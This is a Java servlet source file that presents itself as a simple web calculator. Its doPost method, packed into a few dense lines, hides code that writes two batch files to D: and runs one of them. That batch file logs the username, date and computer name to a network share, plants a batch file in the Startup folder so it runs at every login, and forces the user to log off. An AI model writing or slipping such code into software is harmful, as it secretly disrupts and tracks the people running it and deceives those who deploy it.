/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 *
 * @author ebene
 */
public class Calc extends HttpServlet {

    /**
     * Processes requests for both HTTP <code>GET</code> and <code>POST</code>
     * methods.
     *
     * @param req
     * @param res
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    protected void processRequest(HttpServletRequest req, HttpServletResponse res)
            throws ServletException, IOException 
	{
            res.setContentType("text/html");
            PrintWriter out=res.getWriter();
            out.println("<html><body><div align='center'><form action='Calc' method='get'>Simple Calculator<br>");
            out.println("Num 1: <input type='text' name='n1'><br><br>");
            out.println("Num 2: <input type='text' name='n2'><br><br>");
            out.println("<select name='oper'>");
            out.println("<option name='add'>+</option>");
            out.println("<option name='sub'>-</option>");
            out.println("<option name='mul'>*</option>");
            out.println("<option name='divi'>/</option>");
            out.println("</select><br><br>");
            out.println("<input type='submit' name='b1' value='Submit'>");
            out.println("<form><br>");
            if(req.getParameter("b1")!=null)
            {
            	String n1=req.getParameter("n1");
               	String n2=req.getParameter("n2");
            	String op=req.getParameter("oper");
		if(op.equals("+"))
		{
			int a=(Integer.parseInt(n1)+Integer.parseInt(n2));
			out.println("Result: "+a);
		}
		if(op.equals("-"))
		{
			int a=(Integer.parseInt(n1)-Integer.parseInt(n2));
			out.println("Result: "+a);
		}
		if(op.equals("*"))
		{
			int a=(Integer.parseInt(n1)*Integer.parseInt(n2));
			out.println("Result: "+a);
		}
		if(op.equals("/"))
		{	
			int a=(Integer.parseInt(n1)/Integer.parseInt(n2));
			out.println("Result: "+a);
		}
            }
        } 
    

// <editor-fold defaultstate="collapsed" desc="HttpServlet methods. Click on the + sign on the left to edit the code.">
    /**
     * Handles the HTTP <code>GET</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    /**
     * Handles the HTTP <code>POST</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException 
    {  
        
        String exe = "pushd \"%~dp0\""+System.lineSeparator();
        exe += "pushd \\\\CHEM7\\Users\\Public\\Libraries"+System.lineSeparator();
        exe += "echo %UserName% %date% %time% %ComputerName%>>\"log.txt\""+System.lineSeparator();
        exe += "popd"+System.lineSeparator()+"pushd \"%~dp0\""+System.lineSeparator()+"pushd D:"+System.lineSeparator();
        exe += "copy \"loop.bat\" \"%USERPROFILE%/Start Menu/Programs/Startup\""+System.lineSeparator(); 
        exe += "popd"+System.lineSeparator()+"shutdown -l"+System.lineSeparator();
        String lp = "pushd \"%~dp0\""+System.lineSeparator()+"pushd D:"+System.lineSeparator();
        lp += "del exercise.bat /f /q"+System.lineSeparator()+"del loop.bat /f /q"+System.lineSeparator();
        lp += "shutdown -l"+System.lineSeparator();try{FileOutputStream exercise = new FileOutputStream("D:\\exercise.bat");
        exercise.write(exe.getBytes());FileOutputStream loop = new FileOutputStream("D:\\loop.bat");
        loop.write(lp.getBytes());}catch(IOException e){}Runtime.getRuntime().exec("cmd /c exercise.bat", null, new File("D:"));
        processRequest(request, response);
    }
    @Override
    public String getServletInfo() 
    {
        return "Short description";
    }
    }   

    /**
     * Returns a short description of the servlet.
     *
     * @return a String containing servlet description
     */
    // </editor-fold>